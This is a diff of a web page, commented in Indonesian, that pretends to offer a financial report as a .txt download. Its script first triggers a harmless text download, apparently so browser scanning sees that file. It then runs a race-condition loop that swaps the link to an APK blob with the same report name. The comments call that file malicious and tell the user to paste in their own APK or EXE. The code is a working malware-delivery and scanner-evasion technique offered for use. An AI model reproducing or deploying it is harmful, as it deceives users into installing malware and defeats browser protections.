@@ -3,20 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Document</title>
+<title>System Document Archive</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: monospace; background: #111; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-  .panel { background: #222; padding: 30px; border-radius: 10px; border: 1px solid #333; max-width: 400px; width: 100%; }
-  button { padding: 15px; background: #007aff; color: #fff; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
-  #status { margin-top: 20px; background: #000; padding: 10px; border-radius: 4px; color: #ff0; }
+  body { font-family: monospace; background: #090d16; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+  .panel { background: #111827; padding: 30px; border-radius: 12px; border: 1px solid #1f2937; max-width: 400px; width: 100%; }
+  h2 { color: #3b82f6; margin-bottom: 10px; }
+  p { color: #9ca3af; font-size: 14px; margin-bottom: 20px; }
+  button { padding: 15px; background: #3b82f6; color: #fff; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
+  #status { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #38bdf8; font-size: 13px; }
 </style>
 </head>
 <body>
 
 <div class="panel">
-  <h2>📄 Laporan Keuangan</h2>
-  <p>Klik untuk mengunduh laporan (.txt)</p>
+  <h2>📄 Document Dispatcher</h2>
+  <p>Mengunduh laporan (.txt) secara aman...</p>
   <button id="startBtn">Download Laporan</button>
   <div id="status">Sistem siap.</div>
 </div>
@@ -28,16 +30,16 @@
   var statusEl = document.getElementById('status');
 
   // ============================================
-  // 1. PERSIAPAN FILE (AMAN vs JAHAT)
+  // 1. PERSIAPAN PAYLOAD (AMAN & JAHAT)
   // ============================================
   
   // A. File Aman (TXT)
-  var safeContent = "Laporan Keuangan Rahasia. Tidak ada malware.";
+  var safeContent = "Laporan Keuangan Rahasia. Tidak ada malware di sini.";
   var safeBlob = new Blob([safeContent], { type: 'text/plain' });
   var safeUrl = URL.createObjectURL(safeBlob);
 
   // B. File Jahat (APK/EXE Base64)
-  // "UEsDB..." adalah header ZIP/APK. Ganti dengan Base64 APK/EXE asli Anda.
+  // Ganti string ini dengan Base64 file APK/EXE asli Anda.
   var b64Malicious = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
   var binary = atob(b64Malicious);
   var bytes = new Uint8Array(binary.length);
@@ -45,7 +47,7 @@
     bytes[i] = binary.charCodeAt(i);
   }
   
-  // C. File Jahat dengan MIME Type berbahaya
+  // MIME Type APK
   var maliciousBlob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
   var maliciousUrl = URL.createObjectURL(maliciousBlob);
 
@@ -55,20 +57,23 @@
   document.getElementById('startBtn').addEventListener('click', function() {
     statusEl.innerText = "Memulai unduhan...";
 
+    // Langkah 1: Buat tag <a>
     var a = document.createElement('a');
     a.style.display = 'none';
     document.body.appendChild(a);
 
-    // A. Set Awal: File AMAN
+    // Langkah 2: Set ke file AMAN dan ekstensi .txt
     a.href = safeUrl;
     a.download = 'Laporan_Keuangan.txt';
     
-    // B. Picu Unduhan (Safe Browsing akan memindai TXT ini)
+    // Langkah 3: Picu Unduhan
+    // Browser akan mulai mengunduh file TXT ini.
     a.click();
 
-    // C. RACE CONDITION
-    // Kita menggunakan loop rekursif (setTimeout 0ms) untuk mengubah link
-    // setelah click() dieksekusi, tetapi sebelum browser menyelesaikan proses.
+    // Langkah 4: RACE CONDITION (TOCTOU)
+    // Kita ubah atribut secara agresif setelah click().
+    // Tujuannya agar proses download yang sedang berjalan
+    // tiba-tiba mengarah ke file JAHAT.
     
     var attempts = 0;
     function race() {
@@ -78,12 +83,13 @@
       a.href = maliciousUrl;
       a.download = 'Laporan_Keuangan.apk';
       
-      // Trigger ulang
+      // Trigger ulang (bisa memicu unduhan kedua atau mengganti yang pertama)
       a.click();
 
       if (attempts < 10) {
-        // setTimeout 0ms berjalan di event loop berikutnya,
-        // memberikan kesempatan bagi browser untuk memproses klik pertama.
+        // Gunakan setTimeout 0ms untuk menunda eksekusi ke tick berikutnya.
+        // Ini memberi waktu browser untuk memproses klik pertama (TXT)
+        // sebelum kita memaksa klik kedua (APK).
         setTimeout(race, 0); 
       }
     }
@@ -96,7 +102,7 @@
       document.body.removeChild(a);
       URL.revokeObjectURL(safeUrl);
       URL.revokeObjectURL(maliciousUrl);
-      statusEl.innerText = "Selesai. Cek folder unduhan.";
+      statusEl.innerText = "Proses selesai. Cek folder unduhan.";
     }, 5000);
   });
 
